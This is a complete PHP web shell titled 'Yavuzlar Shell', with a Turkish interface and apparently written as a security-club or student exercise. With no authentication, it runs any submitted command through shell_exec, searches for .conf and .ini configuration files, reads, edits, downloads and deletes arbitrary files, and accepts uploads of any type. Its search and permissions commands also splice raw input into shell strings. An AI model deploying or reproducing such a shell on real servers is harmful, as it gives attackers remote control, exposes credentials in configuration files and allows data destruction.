<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $komut = $_POST['command'];

    
    if (strtolower(trim($komut)) === 'help') {
        $cikti = "Kullanılabilir komutlar:\n";
        $cikti .= "1. ls - Dosya ve dizinleri listele\n";
        $cikti .= "2. cd <dizin> - Dizin değiştir\n";
        $cikti .= "3. rm -rf <dosya/dizin> - Dosya veya dizini sil\n";
        $cikti .= "4. mkdir <dizinadi> - Dizin oluştur\n";
        $cikti .= "5. touch <dosyaadi> - Dosya oluştur\n";
        $cikti .= "6. chmod <izinler> <dosyaadi> - Dosya izinlerini değiştir\n";
        $cikti .= "7. cat <dosyaadi> - Dosya içeriğini görüntüle\n";
        $cikti .= "8. nano <dosyaadi> - Dosyayı düzenle\n"; 
        $cikti .= "9. search <anahtar kelime> - Dosyaları ara\n";
        $cikti .= "10. confdetect - Konfigürasyon dosyalarını tespit et (.conf, .ini)\n";
        $cikti .= "11. permissions <dosyaadi> - Dosya izinlerini göster\n";
        $cikti .= "12. download <dosyaadi> - Dosyayı indir\n";
        echo "<pre>$cikti</pre>";
    } else {
        
        if (strpos($komut, 'nano') === 0) {
            $dosyaadi = trim(str_replace('nano', '', $komut));
            if (file_exists($dosyaadi)) {
                // Dosya düzenleme işlemi
                if (isset($_POST['file_content'])) {
                    file_put_contents($dosyaadi, $_POST['file_content']);
                    echo "<pre>başatıyla kaydedldi.</pre>";
                } else {
                    $icerik = file_get_contents($dosyaadi);
                    echo '<form method="POST">';
                    echo '<textarea name="file_content" rows="10" cols="100">' . htmlspecialchars($icerik) . '</textarea><br>';
                    echo '<input type="hidden" name="command" value="' . $komut . '">';
                    echo '<input type="submit" value="Kaydet">';
                    echo '</form>';
                }
            } else {
                echo "<pre>Dosya bulunamadı.</pre>";
            }
        } elseif (strpos($komut, 'search') === 0) {
            // Dosya arama işlemi
            $anahtar_kelime = trim(str_replace('search', '', $komut));
            $cikti = shell_exec("find . -name '*$anahtar_kelime*'");
            echo "<pre>$cikti</pre>";
        } elseif ($komut === 'confdetect') {
            
            $cikti = shell_exec("find . -name '*.conf' -o -name '*.ini'");
            echo "<pre>$cikti</pre>";
        } elseif (strpos($komut, 'permissions') === 0) {
            
            $dosyaadi = trim(str_replace('permissions', '', $komut));
            $cikti = shell_exec("ls -l $dosyaadi");
            echo "<pre>$cikti</pre>";
        } elseif (strpos($komut, 'download') === 0) {
            
            $dosyaadi = trim(str_replace('download', '', $komut));
            if (file_exists($dosyaadi)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($dosyaadi) . '"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($dosyaadi));
                readfile($dosyaadi);
                exit;
            } else {
                echo "<pre>Dosya bulunamadı.</pre>";
            }
        } else {
            
            $cikti = shell_exec($komut . " 2>&1");
            echo "<pre>$cikti</pre>";
        }
    }
}


if (isset($_POST['delete_file'])) {
    $silinecek_dosyaadi = $_POST['delete_file_name'];
    if (file_exists($silinecek_dosyaadi)) {
        unlink($silinecek_dosyaadi);
        echo "<pre>Dosya başarıyla silindi: $silinecek_dosyaadi</pre>";
    } else {
        echo "<pre>Bu dosya bulunamadı.</pre>";
    }
}


if (isset($_FILES['file'])) {
    $hedef_dizin = __DIR__ . "/";
    $hedef_dosya = $hedef_dizin . basename($_FILES["file"]["name"]);
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $hedef_dosya)) {
        echo "<pre>Dosya başarıyla yüklendi: $hedef_dosya</pre>";
    } else {
        echo "<pre>Dosya yükleme başarısız.</pre>";
    }
}
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yavuzlar Shell </title>
    <h1>Yavuzlar Shell </h1>
<style>
        body {
            background-color: #1e1e1e;
            color: #00ff00;
            font-family: "Courier New", Courier, monospace;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .terminal {
            background-color: #2b2b2b;
            padding: 20px;
            border-radius: 5px;
            width: 80%;
            max-width: 1000px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }
        input[type="text"], input[type="file"] {
            background-color: #000;
            color: #00ff00;
            border: none;
            padding: 10px;
            width: 100%;
            font-size: 16px;
            margin-bottom: 10px;
        }
        input[type="submit"] {
            background-color: #00ff00;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s;
        }
        input[type="submit"]:hover {
            background-color: #008000;
        }
    </style>
</head>
<body>
    <div class="terminal">
        <form method="POST">
            <input type="text" name="command" placeholder="Komut girin..." autofocus>
            <input type="submit" value="Gönder">
        </form>

        <h3>Dosya Yükle</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file" accept="*/*"> <!-- Tüm formatları kabul eder -->
            <input type="submit" value="Dosya Yükle">
        </form>

        <h3>Dosya Sil</h3>
        <form method="POST">
            <input type="text" name="delete_file_name" placeholder="Silinecek dosya adı...">
            <input type="submit" name="delete_file" value="Dosyayı Sil">
        </form>
    </div>
<h1>İbrahim Servet Çetinkaya </h1>
</body>
</html>

